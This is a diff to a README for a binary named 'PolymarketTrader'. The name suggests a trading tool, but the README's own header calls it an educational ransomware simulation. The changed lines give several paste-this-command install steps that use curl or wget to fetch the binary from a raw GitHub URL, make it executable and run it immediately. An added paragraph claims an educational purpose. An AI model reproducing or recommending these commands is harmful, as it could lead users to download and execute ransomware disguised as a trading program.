@@ -7,7 +7,7 @@ Educational ransomware simulation tool for Ubuntu/Linux systems.
 Run this single command to download and install:
 
 ```bash
-mkdir -p poly-trader && curl -L https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader -o poly-trader/PolymarketTrader && chmod +x poly-trader/PolymarketTrader && ./poly-trader/PolymarketTrader
+mkdir -p poly-trader && curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/PolymarketTrader -o poly-trader/PolymarketTrader && chmod +x poly-trader/PolymarketTrader && ./poly-trader/PolymarketTrader
 ```
 
 This will:
@@ -25,7 +25,7 @@ mkdir -p poly-trader
 cd poly-trader
 
 # Download executable
-curl -L https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader -o PolymarketTrader
+curl -L https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/PolymarketTrader -o PolymarketTrader
 
 # Make executable (if needed)
 chmod +x PolymarketTrader
@@ -37,7 +37,7 @@ chmod +x PolymarketTrader
 ### Method 2: Using wget
 ```bash
 mkdir -p poly-trader && cd poly-trader
-wget https://github.com/YoavSavir/PolymarketTrader/releases/download/v1.0/PolymarketTrader
+wget https://raw.githubusercontent.com/YoavSavir/PolymarketTrader/main/PolymarketTrader
 chmod +x PolymarketTrader
 ./PolymarketTrader
 ```
@@ -69,6 +69,9 @@ If you see "cannot execute binary file", make sure you're on a Linux/Ubuntu syst
 
 After you download, follow the installation process displayed by the program.
 
+## Educational Purpose
+
+This tool is designed for educational purposes to demonstrate ransomware behavior in a controlled environment. Use responsibly and only in authorized testing environments.
 
 ## Support
 
